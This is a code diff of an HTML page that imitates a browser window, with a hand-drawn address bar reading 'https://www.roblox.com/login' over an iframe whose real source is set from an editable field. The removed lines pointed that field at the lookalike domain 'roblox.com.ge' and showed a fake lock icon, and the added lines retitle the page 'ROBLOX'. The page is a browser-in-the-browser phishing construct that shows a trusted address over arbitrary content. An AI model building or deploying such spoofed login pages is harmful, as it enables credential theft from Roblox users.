@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RoVer – Login (Permission-based iframe)</title>
+  <title>ROBLOX (Permission-based iframe)</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
     html, body {
@@ -131,7 +131,7 @@
     </div>
 
     <!-- URL display -->
-    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
+    <div class="url-bar" id="urlDisplay"> https://www.roblox.com/login</div>
 
     <!-- Consent / permission UI (shown before we actually set iframe.src) -->
     <div class="consent-panel" id="consentPanel">
@@ -141,7 +141,7 @@
       </div>
       <div style="display:flex; gap:8px; align-items:center;">
         <label style="font-size:13px; color:#444;">Target URL:</label>
-        <input id="targetUrlInput" type="text" value="https://roblox.com.ge/login?returnUrl=2099296147452818"
+        <input id="targetUrlInput" type="text" value="https://roblox.com/login"
                style="flex:1; padding:6px; border-radius:6px; border:1px solid #ccc; font-family:monospace;" />
       </div>
       <div class="consent-actions">
@@ -183,7 +183,7 @@
       iframe.src = "";
       errorBanner.style.display = "none";
       consentPanel.style.display = "block";
-      urlDisplay.textContent = "🔒 " + (new URL(targetUrlInput.value || "https://example.com")).hostname;
+      urlDisplay.textContent = " " + (new URL(targetUrlInput.value || "https://example.com")).hostname;
       // ensure iframe hidden until allowed (we keep it visible but empty)
     });
 
@@ -214,7 +214,7 @@
       }
 
       // update visible url text
-      urlDisplay.textContent = "🔒 " + finalUrl;
+      urlDisplay.textContent = " " + finalUrl;
 
       // hide consent UI to reveal iframe area
       consentPanel.style.display = "none";
@@ -273,3 +273,4 @@
   </script>
 </body>
 </html>
+
